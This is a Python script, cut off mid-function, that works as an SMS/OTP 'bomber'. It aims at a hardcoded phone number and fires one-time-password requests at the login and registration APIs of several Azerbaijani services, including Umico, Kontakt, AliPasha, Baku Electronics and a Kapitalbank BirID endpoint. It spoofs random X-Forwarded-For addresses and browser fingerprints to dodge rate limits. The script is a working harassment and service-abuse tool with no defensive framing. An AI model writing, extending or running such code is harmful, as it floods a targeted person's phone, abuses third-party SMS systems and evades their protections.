import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

# --- HƏDƏF NÖMRƏ ---
TARGET_PHONE = "508880067" # Nömrəni 994 olmadan yazın (məs: 50xxxxxxx)

# Ən effektiv API-lərin siyahısı
API_LIST = [
    {
        "name": "Umico_Login",
        "url": "https://api.umico.az/api/v1/login/otp",
        "method": "POST",
        "json": {"user_identifier": "994" + TARGET_PHONE, "type": "login"}
    },
    {
        "name": "Kontakt_Home",
        "url": "https://kontakt.az/wp-json/contact-api/v1/send-otp",
        "method": "POST",
        "json": {"number": TARGET_PHONE, "type": "login"}
    },
    {
        "name": "AliPasha",
        "url": "https://api.alipasha.az/api/v1/otp/send",
        "method": "POST",
        "json": {"phone": "994" + TARGET_PHONE}
    },
    {
        "name": "BakuElectronics",
        "url": "https://bakuelectronics.az/api/otp/send",
        "method": "POST",
        "json": {"phone": "994" + TARGET_PHONE, "type": "registration"}
    },
    {
        "name": "BirID_Gateway", # Çəkdiyiniz şəkildən analiz olunan API
        "url": "https://bird.kapitalbank.az/auth/realms/bird/login-actions/authenticate",
        "method": "POST",
        "params": {"client_id": "umico", "tab_id": "ey5TL8FdROE"},
        "data": {"phoneNumber": TARGET_PHONE, "resend": "true"}
    }
]

async def bombard(session, api_info):
    name = api_info["name"]
    url = api_info["url"]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0",
        "Accept": "application/json",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    try:
        if api_info["method"] == "POST":
            if "json" in api_info:
                resp = await session.post(url, json=api_info["json"], headers=headers, impersonate="chrome120", timeout=10)
            else:
                resp = await session.post(url, data=api_info["data"], params=api_info.get("params"), headers=headers, impersonate="chrome120", timeout=10)
        
        print(f"[*] {name} Status: {resp.status_code}")
    except:
